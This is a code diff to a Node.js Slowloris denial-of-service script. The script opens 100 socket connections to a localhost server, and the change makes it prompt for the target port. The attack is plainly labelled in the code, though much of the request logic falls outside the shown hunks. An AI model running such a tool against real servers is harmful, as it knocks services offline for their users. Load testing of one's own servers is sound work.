@@ -1,21 +1,31 @@
 const net = require('net')
+const readline = require('readline-promise').default
+
 const client = new net.Socket()
 
 const host = '127.0.0.1'
-const port = 3000
 
 const connections = 100
 let lines = 500
 let activeConnections = 0
 
+const rlp = readline.createInterface({
+  input: process.stdin,
+  output: process.stdout,
+  terminal: true
+})
+
 slowlorisAttack()
 
 function slowlorisAttack() {
-  req = createRequest()
+  rlp.questionAsync('Which port? ').then(p => {
+    const port = p ? p : 3000
+    req = createRequest()
 
-  for(let i = 0; i < connections; i++) {
-    sendRequest(req)
-  }
+    for(let i = 0; i < connections; i++) {
+      sendRequest(req, port)
+    }
+  })
 }
 
 function createRequest() {
@@ -30,7 +40,7 @@ function createRequest() {
   return req
 }
 
-function sendRequest(req) {
+function sendRequest(req, port) {
    const connection = net.connect(port, host, function(){
     activeConnections++
     console.log('Started connection')
